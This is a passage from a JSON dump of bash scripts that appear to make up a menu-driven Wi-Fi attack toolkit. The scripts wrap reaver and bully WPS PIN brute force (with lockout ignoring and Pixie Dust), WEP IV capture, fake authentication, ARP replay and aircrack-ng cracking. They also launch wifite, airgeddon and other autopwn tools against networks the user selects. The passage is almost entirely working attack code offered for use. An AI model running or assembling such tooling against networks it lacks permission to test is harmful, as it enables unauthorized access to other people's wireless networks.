Ignore lockout              CURRENT:\"$IGNORELOCKOUT\"\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\"start\"$CE\") Start\"\n\techo -e \"Choose: \"\n\tread B\n\tclear\n\tif [[ \"$B\" = \"back\" || \"$B\" = \"b\" ]]\n\tthen\n\t\tclear\n\t\tbreak\n\telif [[ \"$B\" = \"start\" ]]\n\tthen\n\t\tif [[ \"$OK\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Error 1\"$CE\"\"\n\t\t\tsleep 3\n\t\telse\n\t\t\tif [[ \"$BRUTE\" = \"ON\" ]]\n\t\t\tthen\n\t\t\t\tLBRUTE=\"-B\"\n\t\t\telse\n\t\t\t\tLBRUTE=\"\"\n\t\t\tfi\n\t\t\tif [[ \"$PIXIE\" = \"ON\" ]]\n\t\t\tthen\n\t\t\t\tLPIXIE=\"-d\"\n\t\t\telse\n\t\t\t\tLPIXIE=\"\"\n\t\t\tfi\n\t\t\tif [[ \"$FORCE\" = \"ON\" ]]\n\t\t\tthen\n\t\t\t\tLFORCE=\"-F\"\n\t\t\telse\n\t\t\t\tLFORCE=\"\"\n\t\t\tfi\n\t\t\tif [[ \"$SEQ\" = \"ON\" ]]\n\t\t\tthen\n\t\t\t\tLSEQ=\"-S\"\n\t\t\telse\n\t\t\t\tLSEQ=\"\"\n\t\t\tfi\n\t\t\tLVERBOSITY=\"-v $VERBOSITY\"\n\t\t\tif [[ \"$IGNORELOCKOUT\" = \"ON\" ]]\n\t\t\tthen\n\t\t\t\tLIGNORELOCKOUT=\"-L\"\n\t\t\telse\n\t\t\t\tLIGNORELOCKOUT=\"\"\n\t\t\tfi\n\t\t\tbully -b $BSSIDT -e $ESSIDT -c $CHANT -v $VERBOSITY -l $LOCKWAIT -1 $WAITPERATTEMPT,1 $LFORCE $LSEQ $LBRUTE $LPIXIE $LIGNORELOCKOUT $WLANNM\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\tfi\n\telif [[ \"$B\" = 1 ]]\n\tthen\n\t\techo -e \"Essid:\"\n\t\tread ESSIDT\n\telif [[ \"$B\" = 2 ]]\n\tthen\n\t\techo -e \"Bssid:\"\n\t\tread BSSIDT\n\telif [[ \"$B\" = 3 ]]\n\tthen\n\t\techo -e \"Channel:\"\n\t\tread CHANT\n\telif [[ \"$B\" = 4 ]]\n\tthen\n\t\tif [[ \"$BRUTE\" = \"ON\" ]]\n\t\tthen\n\t\t\tBRUTE=\"OFF\"\n\t\telse\n\t\t\tBRUTE=\"ON\"\n\t\tfi\n\telif [[ \"$B\" = 5 ]]\n\tthen\n\t\tif [[ \"$PIXIE\" = \"ON\" ]]\n\t\tthen\n\t\t\tPIXIE=\"OFF\"\n\t\telse\n\t\t\tPIXIE=\"ON\"\n\t\tfi\n\telif [[ \"$B\" = 6 ]]\n\tthen\n\t\techo -e \"Wait after lock(in seconds): \"\n\t\tread LOCKWAIT\n\telif [[ \"$B\" = 7 ]]\n\tthen\n\t\techo -e \"Wait per attempt(in seconds): \"\n\t\tread WAITPERATTEMPT\n\telif [[ \"$B\" = 8 ]]\n\tthen\n\t\tif [[ \"$FORCE\" = \"ON\" ]]\n\t\tthen\n\t\t\tFORCE=\"OFF\"\n\t\telse\n\t\t\tFORCE=\"ON\"\n\t\tfi\n\telif [[ \"$B\" = 9 ]]\n\tthen\n\t\tif [[ \"$SEQ\" = \"ON\" ]]\n\t\tthen\n\t\t\tSEQ=\"OFF\"\n\t\telse\n\t\t\tSEQ=\"ON\"\n\t\tfi\n\telif [[ \"$B\" = 10 ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\t\techo -e \"Verbosity (1-4): \"\n\t\t\tread VERB\n\t\t\tclear\n\t\t\tif [[ \"$VERB\" = 1 || \"$VERB\" = 2 || \"$VERB\" = 3 || \"$VERB\" = 4 ]]\n\t\t\tthen\n\t\t\t\tVERBOSITY=\"$VERB\"\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\techo -e \"Number must be 1,2,3 or 4\"\n\t\t\t\tsleep 3\n\t\t\tfi\t\t\t\n\t\tdone\n\telif [[ \"$B\" = 11 ]]\n\tthen\n\t\tif [[ \"$IGNORELOCKOUT\" = \"ON\" ]]\n\t\tthen\n\t\t\tIGNORELOCKOUT=\"OFF\"\n\t\telse\n\t\t\tIGNORELOCKOUT=\"ON\"\n\t\tfi\n\tfi\n\t\ndone\n}\nfunction main_wps_options\n{\nwhile true\ndo\nclear\nTERMINALTITLE=\"WPS MENU\"\ndash_calc\nprintf '\\033]2;WPS MENU\\a'\nif [[ \"$ESSIDT\" = \"\" ]]\nthen\n\techo -e \"\"$YS\" 1\"$CE\") Scan with wash              Selected: \"$RS\"None\"$CE\"\"\nelse\n\techo -e \"\"$YS\" 1\"$CE\") Scan with wash              Selected: \"$YS\"$ESSIDT\"$CE\"\"\nfi\necho -e \"\"$YS\" 2\"$CE\") Reaver bruteforce\"\necho -e \"\"$YS\" 3\"$CE\") Reaver                      (if you already have the WPS pin)\"\necho -e \"\"$YS\" 4\"$CE\") Pixie Dust\"\necho -e \"\"$YS\" 5\"$CE\") Pixie loop till pin found\"\nif [[ -f /usr/bin/bully ]]\nthen\n\techo -e \"\"$YS\" 6\"$CE\") Bully                       AUTOMATED SCRIPT\"\n\techo -e \"\"$YS\" 7\"$CE\") Bully\"\nelse\n\techo -e \"\"$RS\" 6\"$CE\") \"$RS\"Bully\"$CE\"                        AUTOMATED SCRIPT\"\n\techo -e \"\"$RS\" 7\"$CE\") \"$RS\"Bully\"$CE\"\"\nfi\nif [[ -d /root/WiFi-autopwner ]]\nthen\n\techo -e \"\"$YS\" 8\"$CE\") WiFi autopwner\"\nelse\n\techo -e \"\"$RS\" 8\"$CE\") \"$RS\"WiFi autopwner\"$CE\"\"\nfi\nif [[ -d /root/airgeddon ]]\nthen\n\techo -e \"\"$YS\" 9\"$CE\") Airgeddon\"\nelse\n\techo -e \"\"$RS\" 9\"$CE\") \"$RS\"Airgeddon\"$CE\"\"\nfi\nif [[ -d /root/VMR ]]\nthen\n\techo -e \"\"$YS\"10\"$CE\") VMR\"\nelse\n\techo -e \"\"$RS\"10\"$CE\") \"$RS\"VMR\"$CE\"\"\nfi\necho -e \"\"$YS\"11\"$CE\") See latest log\"\necho -e \"\"$YS\" 0\"$CE\") Exit\"\necho -e \"Choose: \"\nread -e YN\nclear\nif [[ \"$YN\" = \"1\" ]]\nthen\n\tscan_wash\nelif [[ \"$YN\" = \"2\" ]]\nthen\n\tif [[ \"$ESSIDT\" != \"\" ]]\n\tthen\n\t\treaver_attack\n\telse\n\t\techo -e \"\"$RS\"No network selected\"$CE\"\"\n\t\tsleep 2\n\tfi\nelif [[ \"$YN\" = \"3\" ]]\nthen\n\tif [[ \"$ESSIDT\" != \"\" ]]\n\tthen\n\t\techo -e \"Enter your target's WPS pin: \"\n\t\tread -e WPST\n\t\tclear\n\t\treaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/lscript/wpslog\n\t\techo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\t\tread\n\telse\n\t\techo -e \"\"$RS\"No network selected\"$CE\"\"\n\t\tsleep 2\n\tfi\n\nelif [[ \"$YN\" = \"4\" ]]\nthen\n\tif [[ \"$ESSIDT\" != \"\" ]]\n\tthen\n\t\tpixie_attack\n\telse\n\t\techo -e \"\"$RS\"No network selected\"$CE\"\"\n\t\tsleep 2\n\tfi\nelif [[ \"$YN\" = \"5\" ]]\nthen\n\tif [[ \"$ESSIDT\" != \"\" ]]\n\tthen\n\t\tpixie_loop\n\telse\n\t\techo -e \"\"$RS\"No network selected\"$CE\"\"\n\t\tsleep 2\n\tfi\nelif [[ \"$YN\" = \"6\" ]]\nthen\n\tif [[ -f /usr/bin/bully ]]\n\tthen\n\t\tif [[ \"$ESSIDT\" != \"\" ]]\n\t\tthen\n\t\t\tbully_script\n\t\telse\n\t\t\techo -e \"\"$RS\"No network selected\"$CE\"\"\n\t\t\tsleep 2\n\t\tfi\n\telse\n\t\techo -e \"\"$RS\"Bully isn't installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to stop monitor mode and install it.\"$CE\"\"\n\t\tread INSTALL\n\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\tthen\n\t\t\tstop2_menu\n\t\t\techo -e \"Press \"$YS\"enter\"$CE\" when connected to a network\"\n\t\t\tread ENT\n\t\t\tinstall_bully\n\t\t\tstart2_menu\n\t\tfi\n\tfi\nelif [[ \"$YN\" = \"7\" ]]\nthen\n\tif [[ -f /root/bully/src/bully.py ]]\n\tthen\n\t\tcd /root/bully/src\n\t\t./bully.py\n\t\tcd\n\telse\n\t\techo -e \"\"$RS\"Bully isn't installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"'to stop monitor mode and install it.\"$CE\"\"\n\t\tread INSTALL\n\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\tthen\n\t\t\tstop2_menu\n\t\t\techo -e \"Press \"$YS\"enter\"$CE\" when connected to a network\"\n\t\t\tread ENT\n\t\t\tinstall_bully\n\t\t\tstart2_menu\n\t\tfi\n\tfi\nelif [[ \"$YN\" = \"8\" ]]\nthen\n\tif [[ -f /root/WiFi-autopwner/wifi-autopwner.sh ]]\n\tthen\n\t\tcd /root/WiFi-autopwner\n\t\t./wifi-autopwner.sh\n\t\tcd\n\telse\n\t\techo -e \"\"$RS\"Wifi autopwner isn't installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to stop monitor mode and install it.\"$CE\"\"\n\t\tread INSTALL\n\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\tthen\n\t\t\tstop2_menu\n\t\t\techo -e \"Press \"$YS\"enter\"$CE\" when connected to a network\"\n\t\t\tread ENT\n\t\t\tinstall_wifiautopwner\n\t\t\tstart2_menu\n\t\tfi\n\tfi\nelif [[ \"$YN\" = \"9\" ]]\nthen\n\tif [[ -d \"/root/airgeddon\" ]]\n\tthen\n\t\tcd /root/airgeddon\n\t\t./airgeddon.sh\n\t\tcd\n\telse\n\t\techo -e \"\"$RS\"Airgeddon isn't installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to stop monitor mode and install it.\"$CE\"\"\n\t\tread INSTALL\n\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\tthen\n\t\t\tstop2_menu\n\t\t\techo -e \"Press \"$YS\"enter\"$CE\" when connected to a network\"\n\t\t\tread ENT\n\t\t\tinstall_airgeddon\n\t\t\tstart2_menu\n\t\tfi\n\tfi\nelif [[ \"$YN\" = \"10\" ]]\nthen\n\tif [[ -d \"/root/VMR\" ]]\n\tthen\n\t\tcd /root/VMR\n\t\t./VMR-MDK-K2-2017R-012x2.sh\n\telse\n\t\techo -e \"\"$RS\"VMR isn't installed.Type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to stop monitor mode and install it.\"$CE\"\"\n\t\tread INSTALL\n\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\tthen\n\t\t\tstop2_menu\n\t\t\techo -e \"Press \"$YS\"enter\"$CE\" when connected to a network\"\n\t\t\tread ENT\n\t\t\tinstall_vmr\n\t\t\tstart2_menu\n\t\tfi\n\tfi\nelif [[ \"$YN\" = \"11\" ]]\nthen\n\tcat /root/lscript/wpslog\n\techo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\tread\nelif [[ \"$YN\" = \"0\" ]]\nthen\n\texit\nfi\ndone\n}\n\n####################################\ndefaults_lh3\nmain_wps_options\n"
        },
        {
          "name": "lh31",
          "type": "blob",
          "size": 0.873046875,
          "content": "#! /bin/bash\n#############DEFAULTS###############\n#setting yellow-start \nYS=\"\\e[1;33m\"\n#setting color-end\nCE=\"\\e[0m\"\n#setting red-start\nRS=\"\\e[1;31m\"\n#setting frequent stings\nYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\nYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\nYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\nPAKT=\"Press \"$YS\"any key$CE to\"\nPAKTC=\"Press \"$YS\"any key$CE to continue...\"\nPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\n####################################\nprintf '\\033]2;REAVER\\a' &&\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\nif [[ \"$GLV\" = \"2\" ]]\nthen\n\techo -e \"Please note that you need a very good signal for this to work.\"\n\tsleep 3\n\techo -e \"Starting...\"\n\tsleep 1\n\tclear\n\treaver -i $WLANNM -b $BSSIDT -d $DELT -S -N -c $CHANT -vv \n\techo -e \"$PAKTC\" \n\tread\nelif [[ \"$GLV\" = \"3\" ]]\nthen\n\treaver -i $WLANNM -b $BSSIDT -p $WPST -vv\n\techo -e \"$PAKTC\"\n\tread\n\nfi\n"
        },
        {
          "name": "lh4",
          "type": "blob",
          "size": 9.2841796875,
          "content": "#! /bin/bash\n#############DEFAULTS###############\n#setting yellow-start \nYS=\"\\e[1;33m\"\n#setting color-end\nCE=\"\\e[0m\"\n#setting red-start\nRS=\"\\e[1;31m\"\n#setting frequent stings\nYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\nYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\nYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\nPAKT=\"Press \"$YS\"any key$CE to\"\nPAKTC=\"Press \"$YS\"any key$CE to continue...\"\nPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\n####################################\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\nfunction dash_calc\n{\n\t\n\tsize=${#TERMINALTITLE}\n\tcalc=$(( 65-size ))\n\tcalc=$(( calc/2 ))\n\tnumcalc=1\n\tDASHESN=\"-\"\n\twhile [ $numcalc != $calc ]\n\tdo\n\t\tDASHESN=\"\"$DASHESN\"-\"\n\t\tnumcalc=$(( numcalc+1 ))\n\tdone\n\techo -e \"$DASHESN\"$RS\"$TERMINALTITLE\"$CE\"$DASHESN\"\n}\nfunction remove_temps\n{\n\tif [[ -f /root/lscript/tempairodump-01.cap ]]\n\tthen\n\t\trm /root/lscript/tempairodump-01.cap\n\tfi\n\tif [[ -f /root/lscript/tempairodump-01.csv ]]\n\tthen\n\t\trm /root/lscript/tempairodump-01.csv\n\tfi\n\tif [[ -f /root/lscript/tempairodump-01.kismet.netxml ]]\n\tthen\n\t\trm /root/lscript/tempairodump-01.kismet.netxml\n\tfi\n\tif [[ -f /root/lscript/tempairodump-01.kismet.csv ]]\n\tthen\n\t\trm /root/lscript/tempairodump-01.kismet.csv\n\tfi\n}\nfunction pre_scan\n{\n#~ while true\n#~ do\n\tif [[ \"$JS\" != 1 ]]\n\tthen\n\t\tremove_temps\n\t\techo -e \"Select what to scan: \"\n\t\techo -e \"\"$YS\"ENTER\"$CE\") All channels\"\n\t\techo -e \" \"$YS\"1\"$CE\"-\"$YS\"13\"$CE\") Specific channel\"\n\t\techo -e \"    \"$YS\"b\"$CE\") Go back\"\n\t\tread CHANNELSL\n\t\tif [[ \"$CHANNELSL\" = \"\" ]]\n\t\tthen\n\t\t\tJS=1\n\t\t\tairodump-ng $WLANNM -w /root/lscript/tempairodump\n\t\telif [[ \"$CHANNELSL\" = \"back\" || \"$CHANNELSL\" = \"b\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\t#~ CH=\"0\"\n\t\t\tbreak\n\t\telse\n\t\t\t#~ FJC=0\n\t\t\tJC=1\n\t\t\tairodump-ng -c $CHANNELSL $WLANNM -w /root/lscript/tempairodump\n\t\tfi\n\tfi\n\t\tap_sort_and_choose\n\t\tif [[ \"$APCHOOSE\" = \"r\" ]]\n\t\tthen\n\t\t\tJS=0\n\t\t\tpre_scan\n\t\t\t#~ continue\n\t\t#~ elif [[ \"$APCHOOSE\" = \"back\" || \"$APCHOOSE\" = \"b\" ]]\n\t\t#~ then\n\t\t\t#~ break\n\t\tfi\t\n\t#~ done\n}\nfunction ap_sort_and_choose\n{\nwhile true\ndo\n\tclear\n\tautoapselect\n\tread APCHOOSE\n\tclear\n\tif [[ \"$APCHOOSE\" = \"back\" || \"$APCHOOSE\" = \"b\" ]]\n\tthen\n\t\tbreak\n\telif [[ \"$APCHOOSE\" = \"r\" ]]\n\tthen\n\t\tJS=0\n\t\tpre_scan\n\t\tbreak\n\telif [[ \"$APCHOOSE\" -le \"$lines\" && \"$APCHOOSE\" -ge 1 ]]\n\tthen\n\t\tif [[ ${ziswep[$APCHOOSE]} != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Please select a WEP protected network.\"$CE\"\"\n\t\t\tsleep 2\n\t\t\t#~ echo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\t\t\t#~ read\n\t\t\tSELECTED=0\n\t\t\tcontinue\n\t\tfi\n\t\tTARGB=\"${zmac[$APCHOOSE]}\"\n\t\tTARGC=\"${zchannel[$APCHOOSE]}\"\n\t\tTARGE=\"${zessid[$APCHOOSE]}\"\n\t\texport TARGB\n\t\texport TARGC\n\t\texport TARGE\n\t\tSELECTED=1\n\t\tclear\n\t\tbreak\n\tfi\ndone\n}\nfunction autoapselect\n{\nfile=\"/root/lscript/tempairodump-01.csv\"\nif [[ -f \"$file\" ]]\nthen\n\tlines=$(cat $file | awk '/WPA|WPA2|OPN|WEP/ {print}' | awk 'END{print NR}')\n\t#add safety-lines\n\tlines=$((lines+10))\nelse\n\tlines=0\nfi\nn2=1\npower=100\nif [[ \"$lines\" != 0 ]]\nthen\n\twhile [ $n2 -le \"$lines\" ]\n\tdo\n\t\tn3=$((n2+2))\n\t\tapower[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /WPA|WPA2/)print $8}')\n\t\taopen[$n2]=0\n\t\tif [[ ${apower[$n2]} = \"\" ]]\n\t\tthen\n\t\t\taopen[$n2]=1\n\t\t\tapower[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $9}')\n\t\t\tweptest=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /WEP/)print $9}')\n\t\t\tif [[ \"$weptest\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tiswep[$n2]=1\n\t\t\telse\n\t\t\t\tiswep[$n2]=0\n\t\t\tfi\n\t\tfi\n\t\tadata[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $10}')\n\t\tif [[ ${adata[$n2]} = \"\" ]]\n\t\tthen\n\t\t\tadata[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $11}')\n\t\tfi\n\t\taessid[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $13}')\n\t\tif [[ ${aessid[$n2]} = \"\" ]]\n\t\tthen\n\t\t\taessid[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $14}')\n\t\tfi\n\t\tachannel[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $4}')\n\t\tif [[ ${achannel[$n2]} = \"\" ]]\n\t\tthen\n\t\t\tachannel[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $4}')\n\t\tfi\n\t\tamac[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $1}')\n\t\tif [[ ${amac[$n2]} = \"\" ]]\n\t\tthen\n\t\t\tamac[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $1}')\n\t\tfi\n\t\tpowerunfixed=\"${apower[$n2]}\"\n\t\tapowerfixed[$n2]=$powerunfixed\n\t\tapowerfixed[$n2]=$((power+apowerfixed[$n2]))\n\t\t#echo \"\"$n2\") \"${apowerfixed[$n2]}\"% \"${amac[$n2]}\" \"${achannel[$n2]}\" \"${adata[$n2]}\" \"${aessid[$n2]}\"\"\n\t\t###DEBUGGING\n\t\t#~ echo -e \"n2=\"$n2\" ${aessid[$n2]}\"\n\t\tn2=$(( n2+1 ))\n\tdone\n\tn3=1\n\twhile [ $n3 -le \"$lines\" ]\n\tdo\n\t\tn=1\n\t\ttopsignal=100\n\t\twhile [ $n -le \"$lines\" ]\n\t\tdo\n\t\t\tif [[ ${apowerfixed[$n]} -le $topsignal ]]\n\t\t\tthen\n\t\t\t\tlowestn=$n\n\t\t\t\ttopsignal=${apowerfixed[$n]}\t\t\t\t\n\t\t\tfi\n\t\t\tn=$((n+1))\n\t\tdone \n\t\tzn[$n3]=$lowestn\n\t\tzopen[$n3]=${aopen[$lowestn]}\n\t\tzdata[$n3]=${adata[$lowestn]}\n\t\tziswep[$n3]=${iswep[$lowestn]}\n\t\tzessid[$n3]=${aessid[$lowestn]}\n\t\tzpowerfixed[$n3]=${apowerfixed[$lowestn]}\n\t\tzmac[$n3]=${amac[$lowestn]}\n\t\tzchannel[$n3]=${achannel[$lowestn]}\n\t\tapowerfixed[$lowestn]=101\n\t\tn3=$((n3+1)) \n\tdone\n\tn3=1\n\techo -e \"\"$YS\"YELLOW\"$CE\"=WEP-PROTECTED NETWORK\"\n\techo -e \"\"$RS\"   RED\"$CE\"=WPA/WPA2-PROTECTED OR OPEN NETWORK\"\n\techo -e \"_________________________________________________________________________________\"\n\techo -e \"     POWER ESSID                                  MAC               CLIENTS  DATA\"\n\twhile [ $n3 -le \"$lines\" ]\n\tdo\n\t\tsize=${#zessid[$n3]}\n\t\tcalc=$(( 40-size ))\n\t\tnumcalc=1\n\t\tSPACES=\"\"\n\t\twhile [ $numcalc != $calc ]\n\t\tdo\n\t\t\tSPACES=\"\"$SPACES\"_\"\n\t\t\tnumcalc=$(( numcalc+1 ))\n\t\tdone\n\t\tif [[ \"$n3\" -le 9 ]]\n\t\tthen\n\t\t\tnum=\" \"$n3\"\"\n\t\telse\n\t\t\tnum=$n3\n\t\tfi\n\t\tsize=${#zpowerfixed[$n3]}\n\t\tif [[ \"$size\" == 3 ]]\n\t\tthen\n\t\t\tspace=\"\"\n\t\telif [[ \"$size\" == 2 ]]\n\t\tthen\n\t\t\tspace=\" \"\n\t\telif [[ \"$size\" == 1 ]]\n\t\tthen\n\t\t\tspace=\"  \"\n\t\tfi\n\t\tDATAA=\" \"$RS\"0\"$CE\"\"\n\t\tif [[ ${zpowerfixed[$n3]} -lt 100 ]]\n\t\tthen\n\t\t\tsize2=${#zessid[$n3]}\n\t\t\tif [[ \"$size2\" -eq 36 ]]\n\t\t\tthen\n\t\t\t\tzessid[$n3]=\"____________________________________\"\n\t\t\tfi\n\t\t\tSTART=\"\"\n\t\t\tif [[ ${zopen[$n3]} = 1 ]]\n\t\t\tthen\n\t\t\t\t#~ START=\"$BS\"\n\t\t\t\tif [[ ${zdata[$n3]} -gt 0 ]]\n\t\t\t\tthen\n\t\t\t\t\tCLIENTS=\"YES\"\n\t\t\t\t\tDATAA=\"${zdata[$n3]}\"\n\t\t\t\telse\n\t\t\t\t\tCLIENTS=\"NO \"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\tif [[ ${zdata[$n3]} -gt 0 ]]\n\t\t\t\tthen\n\t\t\t\t\tCLIENTS=\"YES\"\n\t\t\t\t\t#~ START=\"$YS\"\n\t\t\t\t\tDATAA=\"${zdata[$n3]}\"\n\t\t\t\telse\n\t\t\t\t\t#~ START=\"$RS\"\n\t\t\t\t\tCLIENTS=\"NO \"\n\t\t\t\tfi\n\t\t\tfi\n\t\t\tif [[ ${ziswep[$n3]} = 1 ]]\n\t\t\tthen\n\t\t\t\tSTART=\"$YS\"\n\t\t\telse\n\t\t\t\tSTART=\"$RS\"\n\t\t\tfi\n\t\t\techo -e \"\"$YS\"\"$num\"\"$CE\") \"$START\"${space}\"${zpowerfixed[$n3]}\"%   \"${zessid[$n3]}\"\"$SPACES\"\"${zmac[$n3]}\" \"$CLIENTS\"     \"$DATAA\"\"$CE\"\"\n\t\tfi\n\t\tn3=$((n3+1))\n\tdone\nelse\n\techo -e \"\"$RS\"No networks found nearby.\"$CE\"\"\nfi\necho -e \"\"$YS\" r\"$CE\") rescan\"\necho -e \"\"$YS\" b\"$CE\") Go back\"\necho -e \"Choose: \"\n}\nfunction select_a_network_first\n{\n\tif [[ \"$SELECTED\" != 1 ]]\n\tthen\n\t\techo -e \"\"$RS\"Select a network first\"$CE\"\"\n\t\tsleep 3\n\t\tOUTPUT=1\n\tfi\n}\n\n\n####################################\nwhile true\ndo\n\tclear\n\tTERMINALTITLE=\"WEP MENU\"\n\tdash_calc\n\tprintf '\\033]2;WEP MENU\\a'\n\tif [[ \"$TARGE\" = \"\" ]]\n\tthen\n\t\tTARGE=\"\"$RS\"None\"$CE\"\"\n\tfi\n\tIVF=\"$WEPF\"\n\tif [[ \"$IVF\" = \"\" ]]\n\tthen\n\t\tIVF=\"\"$RS\"None\"$CE\"\"\n\tfi\n\techo -e \"\"$YS\" w\"$CE\") WifiTe automated tool\"\n\techo -e \"\"\n\techo -e \"\"$YS\" 1\"$CE\") Scan networks nearby             Selected:\"$YS\"$TARGE\"$CE\"\"\n\techo -e \"\"$YS\" 2\"$CE\") Start capturing IVs              File:\"$YS\"$IVF\"$CE\"\"\n\techo -e \"\"$YS\" 3\"$CE\") Fakeauth-arpreplay               If no clients connected\"\n\techo -e \"\"$YS\" 4\"$CE\") Fakeauth-fragmentation           not yet\"\n\techo -e \"\"$YS\" 5\"$CE\") Chop-chop                        not yet\"\n\techo -e \"\"$YS\" 6\"$CE\") Aircrack the ivs\"\n\techo -e \"\"$YS\" 7\"$CE\") WiFi autopwner - automated tool\"\n\techo -e \"\"$YS\" 0\"$CE\") Exit\"\n\techo -e \"Choose: \"\n\tread WEP\n\tclear\n\tif [[ \"$WEP\" = \"1\" ]]\n\tthen\n\t\tpre_scan\n\telif [[ \"$WEP\" = \"2\" ]]\n\tthen\n\t\techo -e \"Enter the name of the file(no extension): \"\n\t\techo -e \"(don't use the same name twice)\"\n\t\tread WEPF\n\t\texport WEPF\n\t\tif [[ ! -d /root/handshakes/WEP ]]\n\t\tthen\n\t\t\tmkdir /root/handshakes/WEP\n\t\tfi\n\t\tWEPFF=\"/root/handshakes/WEP/$WEPF-01.cap\"\n\t\texport WEPFF\n\t\txterm -geometry 90x15+9999+999999 -T \"Capturing IVs\" -hold -e \"airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/WEP/$WEPF $WLANNM && echo -e \"\" && echo -e 'Close this window manually'\" & disown\n\telif [[ \"$WEP\" = \"w\" ]]\n\tthen\n\t\twifite --wep\n\telif [[ \"$WEP\" = \"3\" ]]\n\tthen\n\t\tselect_a_network_first\n\t\tif [[ \"$OUTPUT\" == 1 ]]\n\t\tthen\n\t\t\tcontinue\n\t\tfi\n\t\tMYMAC=$(macchanger -s wlan0mon | grep \"Current\" | cut -d ' ' -f5)\n\t\tsize=${#MYMAC}\n\t\tif [[ \"$size\" != 17 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Could not find your MAC\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\texport MYMAC\n\t\txterm -geometry 90x50+0+0 -T \"FAKE AUTHENTICATION\" -hold -e \"while true; do aireplay-ng -1 0 -a $TARGB -h $MYMAC $WLANNM; sleep 5; done && echo -e '' && echo -e 'Close this window manually'\" & disown\n\t\txterm -geometry 90x30+0+999999 -T \"ARP-REPLAY\" -hold -e \"while true; do aireplay-ng -3 -b $TARGB -h $MYMAC $WLANNM; done && echo -e '' && echo -e 'Close this windows manually'\" & disown\n\t#~ elif [[ \"$WEP\" = \"4\" ]]\n\t#~ then\n\t\t#~ clear\n\t#~ elif [[ \"$WEP\" = \"5\" ]]\n\t#~ then\n\t\t#~ clear\n\telif [[ \"$WEP\" = \"6\" ]]\n\tthen\n\t\tif [[ ! -f \"$WEPFF\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"File \"$WEPFF\" not found\"$CE\"\"\n\t\t\tsleep 2\n\t\tfi\n\t\txterm -T \"AIRCRACK THE IVs\" -hold -e \"aircrack-ng $WEPFF\"\n\telif [[ \"$WEP\" = \"7\" ]]\n\tthen\n\t\tcd /root/WiFi-autopwner\n\t\t./wifi-autopwner.sh\n\t\tcd\n\telif [[ \"$WEP\" = \"0\" ]]\n\tthen\n\t\texit\n\tfi\ndone\n"
        },
        {
          "name": "lh41",
          "type": "blob",
          "size": 0.2021484375,
          "content": "#! /bin/bash\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\nprintf '\\033]2;CAPTURING IVs\\a'\necho -e \"Leave me opened.\"\nsleep 1\nairodump-ng --bssid $WEPB -c $WEPC -w /root/handshakes/WEP/$WEPF $WLANNM\n"
        },
        {
          "name": "lh42",
          "type": "blob",
          "size": 1.1875,
